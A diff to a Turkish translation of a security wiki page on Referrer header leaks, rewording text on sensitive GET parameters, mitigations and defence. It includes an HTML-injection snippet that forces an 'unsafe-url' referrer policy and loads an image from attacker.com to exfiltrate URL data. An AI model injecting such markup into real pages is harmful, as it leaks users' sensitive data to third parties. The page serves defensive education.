@@ -6,7 +6,7 @@ Referrer, tarayıcılar tarafından önceki ziyaret edilen sayfayı belirtmek i�
 
 ## Hassas bilgilerin sızdırılması
 
-Eğer bir web sayfasında herhangi bir noktada hassas bilgiler GET isteği parametrelerinde yer alıyorsa, eğer sayfa dış kaynaklara bağlantılar içeriyorsa veya bir saldırgan kullanıcının saldırgan tarafından kontrol edilen bir URL'yi ziyaret etmesini sağlamak için (sosyal mühendislik) bir şekilde yönlendirebiliyorsa, en son GET isteği içindeki hassas bilgileri dışarıya aktarabilir.
+Eğer bir web sayfasında herhangi bir noktada hassas bilgiler GET isteği parametrelerinde bulunuyorsa, eğer sayfa dış kaynaklara bağlantılar içeriyorsa veya bir saldırgan kullanıcının saldırgan tarafından kontrol edilen bir URL'yi ziyaret etmesini sağlamak için (sosyal mühendislik) öneride bulunabiliyorsa, en son GET isteğindeki hassas bilgileri dışarıya aktarabilir.
 
 ## Azaltma
 
@@ -23,13 +23,13 @@ Referrer-Policy: unsafe-url
 ```
 ## Karşı Önlem
 
-Bu kuralı bir HTML meta etiketi kullanarak geçersiz kılabilirsiniz (saldırganın bir HTML enjeksiyonu kullanması gerekir):
-```markup
+Bu kuralı bir HTML meta etiketi kullanarak geçersiz kılabilirsiniz (saldırganın bir HTML enjeksiyonu gerçekleştirmesi gerekir):
+```html
 <meta name="referrer" content="unsafe-url">
 <img src="https://attacker.com">
 ```
 ## Savunma
 
-Hassas verileri asla GET parametreleri veya URL'deki yolların içine koymayın.
+Asla hassas verileri GET parametreleri veya URL'deki yolların içine koymayın.
 
 {{#include ./banners/hacktricks-training.md}}
